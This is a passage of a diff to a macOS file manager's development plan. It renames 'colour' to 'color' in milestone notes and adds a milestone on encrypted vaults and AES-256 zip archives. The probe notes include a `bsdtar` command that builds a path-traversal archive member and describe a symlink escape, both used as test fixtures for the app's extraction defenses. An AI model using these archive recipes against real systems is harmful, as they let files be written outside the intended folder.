    alternative and it silently collides the moment two folders hold an `x.jpg`.
 2. **F8 with an ancestor and its descendant both marked.** *Settled: dedupe to the ancestor* before
@@ -7594,7 +7640,7 @@ itself stays in PLAN.md §6 — the projection is the mitigation, and it is stil
 against whenever a tree-only path is proposed.
 
 **Localization:** M12's rhythm holds — each slice shipped its own catalog keys, so the `Tree View`
-command, the density picker, the three colour wells and the colour-rules editor were translated into
+command, the density picker, the three color wells and the color-rules editor were translated into
 all 14 languages in the slice that added them, with `LocalizationCoverageTests` failing on an
 untranslated command in any of them.
 
@@ -7810,7 +7856,7 @@ Closed with **1678 core + 229 app tests green** (157 and 43 suites), `swiftforma
 
 ### M17 — Syntax highlighting in Quick View (S–M)
 
-Goal: the text preview stops being one colour. M11 gave Quick View its own in-process text view so
+Goal: the text preview stops being one color. M11 gave Quick View its own in-process text view so
 the user could select and copy; M16 made **source** the default rendering for a file that has two.
 Both decisions point here — a file manager that shows you the file should show it the way an editor
 would. Opened 2026-08-06.
@@ -7865,22 +7911,22 @@ Exit: a Swift file, a `Makefile`, a `.json` and a `.sql` each tokenize as expect
 in the app has changed and it does not need a rebuild. **Met** — 37 new tests (1715 core, app suite
 green, both linters clean), the app target untouched.
 
-Six languages went beyond the table and into a **throwaway ANSI-colour probe over this repo's own
+Six languages went beyond the table and into a **throwaway ANSI-color probe over this repo's own
 files**, which is what the working rhythm buys here: the scan can be *read* rather than trusted, and
 three things came out of it that no unit test would have been written for.
 
 - **`prefix` and `postfix` are out of the Swift keyword set.** Both are contextual — they mean
   something only before `func` or `operator` — and `prefix` is one of the most common method names in
-  the language: `data.prefix(n)` came back coloured as a keyword on three lines of `TextPreview.swift`
+  the language: `data.prefix(n)` came back colored as a keyword on three lines of `TextPreview.swift`
   alone. A scanner with no parser cannot tell the two apart, and the false positive is louder than the
-  word it colours. The general shape, and the first live instance of the milestone's own escape hatch:
-  **the honest fix for a construct a scanner gets wrong is to stop colouring it.**
+  word it colors. The general shape, and the first live instance of the milestone's own escape hatch:
+  **the honest fix for a construct a scanner gets wrong is to stop coloring it.**
 - **`.xcstrings` is JSON, not XML.** Slice 2's bullet lists it with the markup family; probed against
   this repo's own catalogs, they open `{ "sourceLanguage": … }`. It routes to `json` and Slice 2 keeps
   four extensions, not five.
 - **A `.h` takes the *union* of C++ and Objective-C**, rather than a guess between three dialects.
   `UTType` says `public.c-header` and no more — which is the whole reason the routing is
-  extension-first — so `cHeader` merges the keyword sets and keeps `@`. A word coloured that a dialect
+  extension-first — so `cHeader` merges the keyword sets and keeps `@`. A word colored that a dialect
   never uses is invisible in the files that do not use it; picking one dialect leaves `class` or
   `@interface` flat in the other two.
 
@@ -7919,10 +7965,10 @@ Three decisions, each of which changed something already written:
 
 - **`SyntaxToken.Kind` grew by two — `.inserted` and `.deleted`.** "Six and no more" was written
   against a *theme* question (§7: how much the user owns — still "none"), and these are two more
-  entries in the same system-colour dictionary, not a Settings surface. The alternative was to borrow
+  entries in the same system-color dictionary, not a Settings surface. The alternative was to borrow
   `.comment` for an added line and `.string` for a removed one, which renders correctly against the
-  colours Slice 3 will likely pick and **couples the diff to a decision about something else**: the
-  day `.comment` becomes grey, as many themes have it, a diff silently loses its green and nothing in
+  colors Slice 3 will likely pick and **couples the diff to a decision about something else**: the
+  day `.comment` becomes gray, as many themes have it, a diff silently loses its green and nothing in
   the code says why.
 - **`SyntaxLanguage.grammar` is now optional, behind an internal `Scanning` enum.** The obvious
   shape — an optional grammar plus a second switch for the three scanner-backed cases — needs a
@@ -7932,7 +7978,7 @@ Three decisions, each of which changed something already written:
 - **The order of the diff scanner's tests *is* its correctness argument.** `--- a/file` and
   `+++ b/file` open with the same characters as a removed and an added line, so the file headers have
   to be tested first — written the other way round, every diff's own header reads as a deletion
-  followed by an insertion, which is a wrong colour exactly where a reader orients themselves.
+  followed by an insertion, which is a wrong color exactly where a reader orients themselves.
 
 And one measurement that corrects the table at the top of this milestone. The pre-milestone probe
 projected **17.2 ms** for a 4 MB scan; the shipping scanner measures **58 ms** (three runs, 57–59,
@@ -7946,14 +7992,14 @@ code-unit helpers was tried and measured as **noise** (52.5 against 51.6, i.e. s
 is reverted rather than kept — the same call NOTES.md records for the three Quick View animation
 fixes that measured worse or identical.
 
-#### Slice 3 — Colour, in the app (S) — landed 2026-08-06
+#### Slice 3 — Color, in the app (S) — landed 2026-08-06
 
 - [x] `SyntaxTheme` — `SyntaxToken.Kind` → `NSColor`. **Authored light/dark pairs, not the system
       palette**, which is a correction to the decision this milestone opened with and is argued
       below.
 - [x] `QuickViewTextView.show` builds an `NSMutableAttributedString` instead of assigning `.string`.
       The font and the `.textColor` default stay exactly as they are — highlighting *adds* foreground
-      colours to a document that already renders correctly, so the un-highlighted case is unchanged
+      colors to a document that already renders correctly, so the un-highlighted case is unchanged
       by construction and an unknown extension is not a special case.
 - [x] The tokenize runs on the existing detached read task in `showText`, beside `TextPreview.read`,
       under the same `loadToken` stale-guard. `TextPreview` gains no knowledge of languages: it
@@ -7970,8 +8016,8 @@ app, 1744 core, both linters clean), and a folder of nine mixed files stepped th
 ⌃⌥Q under both appearances: Python, shell, Swift, HTML, a `git diff`, `PLAN.md`, SQL, CSS and a JSON
 catalog, each correct, with no error on the process's stderr in either run.
 
-**The milestone's colour decision was reversed by a measurement, and re-taken with the user.** M17
-opened (PLAN.md §7) on *system dynamic colours*, on the stated ground that each resolves per
+**The milestone's color decision was reversed by a measurement, and re-taken with the user.** M17
+opened (PLAN.md §7) on *system dynamic colors*, on the stated ground that each resolves per
 appearance for free — "the only way to claim legible in both appearances without a screenshot of
 each". Measured against `.textBackgroundColor` in both appearances, alpha composited, before a line
 of `SyntaxTheme` was written:
@@ -7987,17 +8033,17 @@ The system palette is tuned for **fills** — a button, a badge, a selection —
 background, and the hues that fail are exactly the ones a syntax theme wants most. The premise held
 in dark mode and collapsed in light. So the light half is authored (Xcode's own Default Light values,
 each measured: keyword `#9B2393` 6.87:1, string `#C41A16` 5.99, comment `#267507` 5.79, number
-`#1C00CF` 10.77, type `#3E8087` 4.52) and the dark half stays the system colour. What the plan
+`#1C00CF` 10.77, type `#3E8087` 4.52) and the dark half stays the system color. What the plan
 actually wanted is untouched — one `NSColor` per kind that resolves itself, no Settings, no
 persistence, no picker — and the claim is now **stronger** than the original could make, because
 `SyntaxThemeTests` pins ≥ 4.5:1 for every kind in *both* appearances rather than trusting a
 screenshot of one. Chosen by the user 2026-08-06 over the two alternatives (restrict to the system
-colours that pass, which leaves a diff with no green; or ship the washed-out ones).
+colors that pass, which leaves a diff with no green; or ship the washed-out ones).
 
 Two more things the wiring turned up:
 
 - **`NSTextView.textStorage` does *not* drop the view to TextKit 1**, which had to be probed because
-  the neighbouring rule is the opposite: reading `.layoutManager` does, and `textStorage` is
+  the neighboring rule is the opposite: reading `.layoutManager` does, and `textStorage` is
   historically `layoutManager.textStorage`. On a real window, `textLayoutManager` is still non-`nil`
   after reading `.textStorage` and after a 4 MB `setAttributedString` through it — first display
   0.03 ms, scroll-to-end 2.7 ms, against 0.47 ms to install the same 4 MB as a plain string and
@@ -8013,14 +8059,14 @@ Two more things the wiring turned up:
 
 **Then the palette was re-taken a second time, same day, on sight of a README.** The Xcode-derived
 table above shipped and looked wrong in one specific way the user named immediately: *red, almost
-everywhere*. The cause was only half the colour table. `SyntaxMarkdownScanner` mapped a **fenced code
+everywhere*. The cause was only half the color table. `SyntaxMarkdownScanner` mapped a **fenced code
 block** to `.string`, so the layout tree and both `bash` blocks in this repo's own README rendered as
 one continuous red mass — a fence is routinely the largest thing on a page, so painting it all one
-literal colour makes the loudest region of the document the one carrying the least meaning. Two
+literal color makes the loudest region of the document the one carrying the least meaning. Two
 changes, and the second is the one that mattered:
 
 - **The palette is now VS Code's Dark Modern and Light Modern on both halves** (`dark_plus` /
-  `light_plus` token colours), replacing Xcode-light-plus-system-dark. Not an aesthetic preference
+  `light_plus` token colors), replacing Xcode-light-plus-system-dark. Not an aesthetic preference
   but a choice of *whose* theme: a file manager's preview is read beside the editor the file will be
   opened in. It cost nothing to verify — measured against the real `.textBackgroundColor` in both
   appearances before anything was written, every published value clears the same 4.5:1 floor
@@ -8029,11 +8075,11 @@ changes, and the second is the one that mattered:
   `#4EC9B0` 8.18). The dark half needed no adjustment at all, and that is not luck:
   `.textBackgroundColor` resolves to exactly `#1E1E1E` in dark mode, which *is* VS Code's classic
   editor background — the dark values are measured on the background they were designed for.
-  `SyntaxThemeTests.mayShareAColour` gained one change: `inserted` now shares with `number` rather
+  `SyntaxThemeTests.mayShareAColor` gained one change: `inserted` now shares with `number` rather
   than with `comment`, which is VS Code's own collision (both `#b5cea8` / `#098658` there too).
 - **A fence is three tokens, not one.** The two delimiter *lines* take `.keyword`, on the heading's
   argument — they are the document's own structure — and the **body** is scanned as the language its
-  info string names, or left entirely uncoloured when it names none. `SyntaxLanguage.forFenceInfo`
+  info string names, or left entirely uncolored when it names none. `SyntaxLanguage.forFenceInfo`
   is its own entry point rather than a call to `forFile(named:)`, because the two vocabularies
   disagree in both directions: `makefile` and `dockerfile` are whole *names* on that side and would
   be read as extensions, and the spelled-out `python`, `javascript`, `shell`, `objective-c` — what
@@ -8045,34 +8091,34 @@ changes, and the second is the one that mattered:
 
 Live-verified on this repo's README in both appearances: the layout tree renders plain, the `bash`
 blocks render as bash, and flipping the system appearance with the preview already open re-resolves
-every colour in place — which is the dynamic-pair design doing what it was built for.
+every color in place — which is the dynamic-pair design doing what it was built for.
 
 #### Deliberately not in scope
 
 Stated up front, because this is the milestone whose scope has no natural floor, and the correctness
 tail is what would turn three days into three weeks. A regex-free single-pass scanner is about 95 %
 right, and the remaining 5 % is a list of *decisions*, not bugs: **string interpolation** (`\(…)` in
-Swift, `${…}` in JS and shell — a keyword inside a string will be coloured as a string, which is the
+Swift, `${…}` in JS and shell — a keyword inside a string will be colored as a string, which is the
 quiet direction), **JS regex literals** (the `/` ambiguity with division is genuinely undecidable
-without a parser), **heredocs** in shell and PHP, **JSX**, and semantic colouring of any kind (a type
+without a parser), **heredocs** in shell and PHP, **JSX**, and semantic coloring of any kind (a type
 is a type because of a declaration somewhere else — that is a compiler, not a scanner). Each gets a
 comment naming it where the grammar would otherwise have handled it, so the next reader knows it was
 chosen.
 
 Also not in scope, each for its own reason: a **theme picker** (costed alongside this at the estimate
-— per-appearance colour pairs, persistence, a Settings section; deferred in favour of system colours,
+— per-appearance color pairs, persistence, a Settings section; deferred in favor of system colors,
 and the M15 palette work is the precedent for what it costs if it is ever wanted); **line numbers,
 folding and a minimap**, which are editor features, and Dirnex hands editing to the user's own editor
 (§M11's largest deliberate call); highlighting inside the **rendered** HTML style, which is the page's
 own business; and any third-party highlighter — **Highlightr** (highlight.js in a `JSContext`) buys
 ~190 languages at the price of a dependency, a JS engine on every cursor step and output §2 cannot
 test, and **tree-sitter** is a C dependency plus one compiled grammar per language. Both rejected
-2026-08-06 in favour of a hand-rolled scanner the core can test.
+2026-08-06 in favor of a hand-rolled scanner the core can test.
 
 ### M18 — Quick View: Markdown as a document (M)
 
-Goal: `.md` becomes the **second dual-style type**. `1` keeps the source, coloured by M17's Markdown
-scanner; `2` renders the document those bytes describe — headings, tables, lists, coloured code,
+Goal: `.md` becomes the **second dual-style type**. `1` keeps the source, colored by M17's Markdown
+scanner; `2` renders the document those bytes describe — headings, tables, lists, colored code,
 `[[_TOC_]]` and mermaid diagrams — **hand-rolled end to end**, with no JavaScript in the page and no
 third-party renderer anywhere in it. Opened 2026-08-06, closed 2026-08-07 with all four slices
 landed.
@@ -8081,14 +8127,14 @@ M16 named this in its own undone column ("Markdown and RTF as dual-style types")
 worth taking: a `.md` is the format most likely to be *read in a file manager* rather than opened,
 and what Quick Look shows for one today is plain text with the syntax on display. Almost everything
 the milestone needs already exists — the render-style enum and its two keys, the sandboxed web view
-with its compiled block-remote rules, and the scanner that can colour a fence's contents. What is
+with its compiled block-remote rules, and the scanner that can color a fence's contents. What is
 missing is a renderer.
 
 **Where the work lives.** Markdown → HTML is a pure function over bytes, so §2 puts it in
 `DirnexCore` with tests; the *stylesheet* is presentation and stays in the app — exactly the division
 M17 already draws between `SyntaxToken.Kind` and `SyntaxTheme`, and the one `TextPreview`'s own doc
-comment states. The core emits semantic HTML carrying class names and never a colour; the app hands
-the web view a `<style>` block built from `SyntaxTheme` and the system label colours. That is what
+comment states. The core emits semantic HTML carrying class names and never a color; the app hands
+the web view a `<style>` block built from `SyntaxTheme` and the system label colors. That is what
 makes the rendered page follow light and dark for free, diagrams included.
 
 **Raw HTML in a `.md` is escaped, not passed through.** CommonMark says to pass it; a preview that
@@ -8138,8 +8184,8 @@ anything half-built.
 
 - [x] `MarkdownBlockParser` — a line-oriented **block** pass, then an **inline** pass per block. Two
       passes rather than M17's one, and the departure is the point: that scanner is single-pass with
-      one lookahead *because* it only ever adds colour, so a construct it gets wrong is a wrong
-      colour. A renderer produces the document itself, and gets the previous line and the block's
+      one lookahead *because* it only ever adds color, so a construct it gets wrong is a wrong
+      color. A renderer produces the document itself, and gets the previous line and the block's
       whole text. Which is also why **setext headings and indented code blocks** — both named in
       M17's undone column as needing a lookahead the scanner does not keep — are in scope here, and
       both landed.
@@ -8187,7 +8233,7 @@ Two findings worth carrying:
   reached a **tag**: the attribute names against a closed set, and every `href`/`src` scheme against
   an allow-list. Now in docs/NOTES.md ▸ Testing.
 
-#### Slice 2 — `[[_TOC_]]`, anchors, and coloured fences (S, core-only) — landed 2026-08-06
+#### Slice 2 — `[[_TOC_]]`, anchors, and colored fences (S, core-only) — landed 2026-08-06
 
 - [x] Heading slugs, GitHub's rule, emitted as `id` on every heading so any anchor in the document
       resolves — including the ones the file's author already wrote by hand. **Measured, not read**:
@@ -8199,7 +8245,7 @@ Two findings worth carrying:
       what makes a marker inside a code fence stay text, and it does.
 - [x] A fence whose info string names a language is tokenized through **M17's existing
       `SyntaxHighlighter`** and emitted as one `<span class="tok-…">` per `SyntaxToken.Kind`, so the
-      fence in the rendered page and the file in source mode are coloured by the same scanner and the
+      fence in the rendered page and the file in source mode are colored by the same scanner and the
       same table. No language, or one no grammar claims, is plain `<code>` — the same "an unknown
       type is not a special case" rule the text backend already keeps.
 
@@ -8247,7 +8293,7 @@ Three findings worth carrying:
       we generate has no scripts to refuse. Same argument that already keeps it out of source mode.
       It is the one site that deliberately keeps asking `isRenderableHTML`, so it has its own test.
 - [x] `QuickViewMarkdownStyle` — the stylesheet, built at load time from `SyntaxTheme` for fences and
-      the system label colours for the document, with the system font for prose and the fixed-pitch
+      the system label colors for the document, with the system font for prose and the fixed-pitch
       font for code. **Not** re-generated on `viewDidChangeEffectiveAppearance`: probed, the page
       follows the appearance itself, so it carries both palettes instead (below).
 - [x] `QuickViewMarkdownImages` — the answer to the milestone's first probe, which did not come out
@@ -8260,10 +8306,10 @@ Three findings worth carrying:
       through a folder of `.md`.
 
 Exit: **met**, live at all three sizes. `2` renders `PLAN.md` and a document exercising every
-construct; `1` still shows the coloured source; a TOC link moved the reading position by real click;
+construct; `1` still shows the colored source; a TOC link moved the reading position by real click;
 ← / → stepped and re-rendered even after clicking *into* the page; `⌘L` then `/tmp/12` put both
 digits in the path field with the preview up (M16's own regression); and flipping the system to light
-and back re-coloured the page **with the scroll position pixel-identical**. 29 new tests (16 app + 13
+and back re-colored the page **with the scroll position pixel-identical**. 29 new tests (16 app + 13
 core), 1844 core + 253 app green, both linters clean.
 
 Four findings worth carrying:
@@ -8288,7 +8334,7 @@ Four findings worth carrying:
   effective appearance with no `color-scheme` declaration and re-evaluates with **no reload**, so the
   stylesheet carries both palettes under one media query. The design this replaced (re-generate on
   `viewDidChangeEffectiveAppearance`) would have thrown away the reading position on every flip.
-- **There is no system colour for "slightly off the text background".** `.windowBackgroundColor` and
+- **There is no system color for "slightly off the text background".** `.windowBackgroundColor` and
   `.controlBackgroundColor` are byte-identical to it in both appearances, `.gridColor` inverts in
   dark, and even the gentlest fill takes `typeOrTag` from 4.59:1 to **3.68:1** — because M17 authored
   that palette against `.textBackgroundColor`. So a code fence is bordered rather than filled. All in
@@ -8305,8 +8351,8 @@ Four findings worth carrying:
       removal**, so `A --> B --> A` draws instead of hanging. A sequence diagram is positional and
       needs no layout beyond column and row arithmetic. **One thing the plan did not name and the
       first live run demanded: dummy nodes** (below).
-- [x] `MermaidSVG` — the emitter, in class names and `currentColor` and never a literal colour, so
-      Slice 3's stylesheet colours the diagram in both appearances the way it colours everything else.
+- [x] `MermaidSVG` — the emitter, in class names and `currentColor` and never a literal color, so
+      Slice 3's stylesheet colors the diagram in both appearances the way it colors everything else.
 - [x] Text width through the injected metric from the probe above; the fixed-advance fake makes every
       layout assertion in the tests exact.
 - [x] Anything else in a `mermaid` fence — a class diagram, a gantt, a state chart, an ER diagram —
@@ -8318,7 +8364,7 @@ Four findings worth carrying:
 Exit: **met**, verified live at full-window size in both appearances. `PLAN.md`-style prose carrying
 a flowchart, an `LR` chart and a sequence diagram draws all three legibly; `stateDiagram-v2` shows
 its source and names itself; a `subgraph` chart draws *and* reports the frame it did not draw; `1`
-still shows the coloured source. 60 new tests (54 core + 6 app), 1902 core + 260 app green, both
+still shows the colored source. 60 new tests (54 core + 6 app), 1902 core + 260 app green, both
 linters clean.
 
 Four findings worth carrying:
@@ -8347,13 +8393,13 @@ Four findings worth carrying:
 
 Followed up 2026-08-07 after reading a page: a diagram laid out in the *small* system size reads
 noticeably smaller than the prose beside it, so a finished drawing is now **magnified** —
-`MarkdownRenderOptions.diagramScale`, 1.25 in the app — and the figure is centred in the reading
+`MarkdownRenderOptions.diagramScale`, 1.25 in the app — and the figure is centered in the reading
 column. Magnifying the `<svg>`'s displayed size while the `viewBox` stays put is what makes it one
 line rather than a second layout: boxes, gaps, strokes and labels all grow together, so no
 proportion the layout measured can drift, and `max-width: 100%` still shrinks the whole thing on a
 narrow window. Growing the label font instead would have grown the text inside boxes whose paddings
-and layer gaps are constants. The centring needs its own carve-out for the fallback — a `<pre>`
-inside a centred `<figure>` is *source code*, and it stays left-aligned.
+and layer gaps are constants. The centering needs its own carve-out for the fallback — a `<pre>`
+inside a centered `<figure>` is *source code*, and it stays left-aligned.
 
 #### Deliberately not in scope
 
@@ -8374,3 +8420,8851 @@ inside a centred `<figure>` is *source code*, and it stays left-aligned.
 - **Exporting the rendered page** to HTML or PDF. Plausible as a next thing, and it is a *file
   operation*: it belongs in the operation engine with a destination and a conflict policy, not bolted
   onto a preview.
+
+### M19 — Encryption (M)
+
+Goal: two halves, deliberately separate products sharing a milestone — **a vault you live in** (an
+encrypted APFS sparsebundle, unlocked into a mounted volume the existing `LocalBackend` already
+browses) and **a password on an archive you send someone** (WinZip AES-256, the format 7-Zip and
+WinRAR read on Windows). Opened 2026-08-09 and closed the same day, both slices landed and both
+halves verified by driving the built app.
+
+The two share a milestone because they share everything that is hard about the feature and nothing
+else: one passphrase type that owns and wipes its own buffer, one rule that a secret never reaches
+`argv`, and one piece of wording for the failure that cannot be undone. What they do *not* share is
+a code path — a vault is `hdiutil` and a mounted volume, an encrypted archive is libarchive and a
+file — which is why the sidebar gained a section and the pack sheet gained four controls, and
+neither knows about the other.
+
+#### What was probed first (2026-08-09)
+
+Everything below was measured before any Swift was written (§"How to work here"), and the **first
+probe overturned the architecture decision the milestone opened on**. All of it is in docs/NOTES.md
+▸ Encryption; the short form and what each one decided:
+
+- **`bsdtar` cannot be given a passphrase safely** — captured live from the running process's argv:
+  `--passphrase SUPERSECRET123` sits in `argv` in plain text, readable by any `ps`, which is the
+  exact practice this repo already forbids for `curl -u`. Unlike `curl` there is no escape hatch: no
+  `-K -`-style config on stdin exists, and the interactive prompt on a non-tty stdin **loops
+  forever** rather than failing (166 KB of `Enter passphrase:` before the probe was killed). This is
+  what broke §2's "bsdtar over libarchive" and produced the scoped exception below.
+- **The system libarchive is linkable and takes the passphrase in memory.**
+  `/usr/lib/libarchive.2.dylib` (3.7.4) ships *with* macOS and the SDK carries `libarchive.2.tbd`
+  with all 427 symbols, so this is a system library and not a dependency. No `archive.h` in the SDK,
+  so the prototypes are declared by hand. Three things came free and are the reason to reach for it
+  again: byte-accurate progress, real cancellation between chunks, and errors as return codes
+  instead of scraped English.
+- **An AES-256 zip is unopenable by everything Apple ships** — `unzip` says `skipping: …
+  unsupported compression method 99`, `ditto` `Unknown compression type`, Archive Utility is the
+  same code, and Windows Explorer's built-in zip cannot read it either. The *format* is right
+  (verified from the bytes: method 99, extra field `0x9901`, AE-2, strength 3, inner method 8); it
+  is the platform support that is missing. So the sheet says which apps can open it, rather than
+  letting the recipient find out. The only interoperable-everywhere alternative is `zipcrypt`, which
+  has a published known-plaintext break and must never ship under a checkbox saying "Encrypt".
+- **No zip encrypts file names, ever** — the central directory is plaintext by design, and
+  `bsdtar -tvf` on an AES-256 archive prints every name, size and mtime with no passphrase. The only
+  fix is one inner archive holding the payload, and it must be a **tar**: tar stores bytes verbatim
+  so the outer zip's deflate is the only compression pass (zip-in-zip compresses twice and comes out
+  *larger*), and it carries permissions and symlinks losslessly. The wrapper gets a fixed mode and
+  the current time, because a real file's would leak a fact about the contents into the part that
+  stays readable.
+- **An archive is untrusted input, and `bsdtar` will happily build the attack for you.**
+  `bsdtar -s '|payload.txt|../../escaped.txt|'` stores a literal traversal member in one stock
+  command; the second shape is the one that survives a naive fix — `escape -> /tmp` followed by
+  `escape/pwned.txt`, where every *name* is innocent and the symlink written one entry earlier is
+  what puts the write outside. Hence two independent layers, with the fixtures produced by `bsdtar`
+  itself.
+- **`hdiutil -stdinpass` keeps the passphrase out of argv entirely** — confirmed by scanning the
+  whole process tree mid-run (`hdiutil`, `diskimages-helper`, `copy-helper`, `diskimagesiod`) for a
+  known passphrase and finding it in none of them. That is what makes an encrypted disk image the
+  right shape for a vault at all.
+- **A growable encrypted `SPARSEBUNDLE` costs 23 MB for a declared 10 GB APFS volume**, so a vault
+  need not ask the user to predict how much they will ever store. It is a *directory*, which makes
+  it awkward to send — which is fine, that is the archive half's job.
+- **`-stdinpass` reads that pipe verbatim to EOF**, so a trailing newline becomes part of the
+  passphrase. Measured both ways: an image created with `printf 'p\n'` refuses to attach with
+  `printf 'p'`. Writing a *line* to a subprocess is the natural thing to do, and doing it here would
+  mint vaults whose real passphrase is not the one their owner typed — locked out of Disk Utility,
+  Finder and Dirnex on any other Mac, permanently, with nothing on screen ever hinting why.
+- **`resolvingSymlinksInPath` and `standardizingPath` fold `/private` only for paths that currently
+  exist**, so neither is a normalizer — both are filesystem *queries* wearing one's clothes, and an
+  identity built on either changes the moment the image is deleted, which is exactly when its
+  Keychain entry still has to be found in order to be cleaned up. `hdiutil` answers with the
+  `/private` spelling while the user says `/tmp`, so the comparison is unavoidable; the three
+  firmlink prefixes are folded in string space instead.
+
+#### Slice 1 — the core (additive, app untouched) — landed 2026-08-09
+
+- [x] `CArchiveShim` + `LibArchive` — the C declarations and the Swift side of the **system
+      libarchive**. An explicit, scoped exception to §2, taken on the measurement above:
+      `archive_write_set_passphrase` takes a buffer `ArchivePassphrase` owns and wipes. The header
+      declares **38 prototypes and nothing else** — each checked against the SDK stub, so a drifted
+      name fails at link time — and the integer constants deliberately live on the Swift side rather
+      than arriving as imported macros. The exception is confined to the encrypted path; browsing
+      and ordinary packing still use `bsdtar`.
+- [x] `EncryptedArchiveWriter` / `EncryptedArchiveReader` (+ `…+Wrapping` / `…+Placing`) — write and
+      read an AES-256 zip, with byte progress, cancellation between chunks and entries, and the
+      archive built under a temporary name and renamed into place only on success, so a canceled
+      pack leaves nothing to mistake for a whole archive later. `inspect` reads headers only, which
+      is what lets the app ask "does this need a passphrase" for free.
+- [x] `ArchivePassphrase` — the type the secret lives in, from the field to the syscall. Two
+      spellings that differ by exactly the byte that would break a vault forever: `withUnsafeBytes`
+      (the passphrase and then a close — what `-stdinpass` needs) beside `withUnsafeCString`. Both
+      look right at the call site, which is the whole reason they are one type's two methods and not
+      two call sites' improvisations.
+- [x] `ArchiveEntryPath` — the traversal defense, in two independent layers: a name rule, and an
+      `lstat` walk that refuses to descend through a symlink (the path-shaped equivalent of
+      `openat(O_NOFOLLOW)`). Both attack fixtures were produced by `bsdtar` itself, and each layer
+      has a **negative control** — with the name rule deliberately neutered, the `lstat` walk still
+      blocked the write.
+- [x] `ArchiveNamePrivacy` — the answer to zip's permanent plaintext central directory: wrap the
+      payload in one inner tar so the outer archive lists a single entry. **Off by default** (agreed
+      with Oleg, 2026-08-09), because the recipient otherwise unpacks twice.
+- [x] `DiskImageArguments` / `DiskImageMount` / `DiskImageProgress` / `VaultLocation` / `VaultError`
+      — the vault's pure half over `hdiutil`, with the plist and `-puppetstrings` parsing tested
+      against **captured real output** rather than invented output (`hdiutil-attach.plist`,
+      `hdiutil-info.plist`). `attach -plist` reports several `system-entities` and only one carries a
+      mount point, and `PERCENT:-1.000000` is a sentinel that brackets a run at both ends — two
+      shapes a hand-written fixture would not have had.
+- [x] `EncryptedArchiveError` / `VaultError` — named cases with stable key tokens, never a free-form
+      `String` payload, so every sentence a user can see is translatable (the `VFSError.unsupported`
+      trap, docs/NOTES.md ▸ Localization). `passphrasesDoNotMatch` is one of them: the two-field
+      confirmation §6 asks for is a named error rather than an assertion.
+
+Exit: **met.** 46 new tests, 1971 total green, both linters clean; the app was untouched and did not
+rebuild.
+
+#### Slice 2 — the app — landed 2026-08-09
+
+**Encrypted archives.**
+
+- [x] The pack sheet gained Encryption / Passphrase / Repeat / "Hide file names", and a footer that
+      says plainly what a lost passphrase costs *and* which apps can open the result. Moving away
+      from zip **resets** the popup rather than merely disabling it — a grayed "AES-256" over a
+      `.tar.gz` reads as a promise the writer cannot keep — and the footer is measured at build time
+      for its longest state so the accessory's frame never moves under the popup.
+- [x] An encrypted pack goes on the **operation queue** as `FileOperation.Kind.pack`
+      (`PackJob` / `PackRunner`, `ChecksumRunner`'s shape) rather than on a detached task. It is the
+      one pack that can run for minutes, and the queue already owns the determinate bar, the cancel,
+      the pause and the one-job-per-volume rule. The queue is therefore not "where packing happens"
+      — it is where *encrypting* happens, which is the boundary the libarchive exception drew.
+- [x] Extraction asks for the passphrase **only when the archive needs one** — a headers-only read,
+      measured at 3–4 ms on a 600 MB, 301-entry archive, so it can be asked unconditionally — and a
+      refused passphrase re-asks instead of dead-ending, because a wrong passphrase is an ordinary
+      typo and an error alert would make the user re-select the files to get another go.
+      `PassphrasePrompt` is one field, never two: here the passphrase is checked against something
+      that already exists, so a typo costs a retry rather than an unopenable archive.
+- [x] That gate also closed a **live hang that predated the milestone**: `bsdtar -xf` on an AES-256
+      zip with stdin closed writes 170 KB of `Enter passphrase:` in eight seconds and never exits
+      (it re-prompts on EOF), which was reachable from every extract path and would have hung a
+      thread with nothing on screen to say why.
+
+**Vaults.**
+
+- [x] New Vault… / Unlock Vault / Lock Vault in the registry, **beside Connect to Server**, since
+      all four open a *place*; the commands live on the window rather than a pane, because what they
+      do spans both panes and the sidebar.
+- [x] A sidebar **Vaults** section between Volumes and Servers — a local volume that has to be
+      unlocked before it appears, so it sits between the two things it is half of. **The padlock is
+      asked of `hdiutil`, never remembered**, so a `detach` in Terminal or an eject in Finder cannot
+      leave a row lying: one subprocess per rebuild (12–14 ms), asked once for the whole section
+      rather than once per row, and not at all when the user has no vaults.
+- [x] `SavedVaults` + `VaultStore` for the list — addressing only, in boring JSON, with the
+      passphrase in the Keychain through the same `KeychainAddressable` the servers use. That type
+      is the one formerly called `ServerKeychain`, renamed **`SecretKeychain`** once a vault, which
+      is not a server, needed the identical call.
+- [x] Creating a vault writes the image **where you stand** and opens the volume in the *other* pane
+      — the dual-pane shape the app is built around, since what you want next is to copy things in.
+      Locking moves any pane standing inside it out first, and to the **image's own folder with the
+      cursor on the image**, not to Home: the thing you were just working with stays under the
+      cursor, ready to unlock again.
+
+Exit: **met**, both halves verified by driving the built app. 1983 core tests and 276 app tests
+green, both linters clean, 36 new strings across 14 languages.
+
+Three decisions taken during the slice, each from a measurement rather than a preference:
+
+- **No progress UI for a vault create, and no image-kind choice.** A sparse bundle's creation is
+  constant-time in its declared ceiling — 100 GB, 500 GB and 2 TB each took 1.02 s and each cost
+  34 MB — and emits no `PERCENT:` lines at all. So the planned deferred progress sheet was **deleted
+  rather than built**, and the sheet asks for a name, a size ceiling and the passphrase and nothing
+  else. It is also why the size field can offer a generous default: a bigger ceiling costs nothing,
+  in bytes or in seconds. `DiskImageArguments.Kind.fixed` stays in the core, tested, for whatever
+  wants it later — a fixed `UDIF` image does report progress properly, which is why the reader keeps
+  reading it.
+- **The passphrase reaches `hdiutil` as bytes and a close, never a line.** `-stdinpass` takes that
+  pipe verbatim to EOF, so an appended `\n` becomes a permanent, invisible part of the passphrase
+  and the vault stops opening to the phrase its owner typed.
+  `ArchivePassphrase.withUnsafeBytes` is the one spelling that cannot get it wrong.
+- **Unlocking an image adds it to the sidebar.** A vault you have opened is one you will open again,
+  and Remove from Sidebar — which says in as many words that the file and its contents are untouched
+  — is one right-click away. The alternative is a Vaults section you have to populate by hand.
+
+Two decisions taken at open, both by Oleg: **AES-256 only** (never `zipcrypt`, which is broken, and
+not AES-128, which buys nothing on hardware AES), and **sparsebundle** for vaults.
+
+Two findings worth carrying:
+
+- **A vault introduces no new backend, and that is what kept it clear of the trap.** Unlocked, it is
+  a mounted volume `LocalBackend` already browses, so every gesture is about *reaching* a directory
+  rather than about a new kind of place — which is why none of the "name the new backend at every
+  site that lists the old ones" audit (docs/NOTES.md ▸ AppKit) was owed here.
+- **The confirmation wording is a deliverable, and it shipped in both sheets.** §6 made it one
+  because a forgotten passphrase is the only failure in Dirnex that is silent, total and permanent.
+  The vault note pairs the warning with where the passphrase is kept — "Dirnex saves it in your
